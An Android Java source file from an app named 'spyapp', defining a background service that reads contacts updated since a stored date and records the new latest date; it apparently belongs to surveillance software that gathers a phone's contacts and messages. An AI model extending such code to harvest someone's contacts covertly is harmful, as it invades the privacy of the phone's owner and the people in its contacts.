package com.app.spyapp.servercall;

import android.app.IntentService;
import android.content.Intent;

import com.app.spyapp.SpyApp;
import com.app.spyapp.common.Const;
import com.app.spyapp.common.Pref;
import com.app.spyapp.model.ContactModel;
import com.app.spyapp.model.SMSModel;

import java.util.ArrayList;

/**
 * Created by Ankit on 5/29/2016.
 */
public class ContactCallService extends IntentService {

    private SpyApp spyApp;

    public ContactCallService() {
        super(SMSCallService.class.getSimpleName());
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        spyApp = (SpyApp) getApplicationContext();
        ArrayList<ContactModel> contactList = spyApp.getDatabaseHelper().getContactList(spyApp.getSharedPreferences().getString(Pref.CONTACT_LAST_UPDATEDATE, Const.INITDATETIME));
        spyApp.getSharedPreferences().edit().putString(Pref.CONTACT_LAST_UPDATEDATE, spyApp.getDatabaseHelper().getMaxDateofContact()).apply();

    }
}
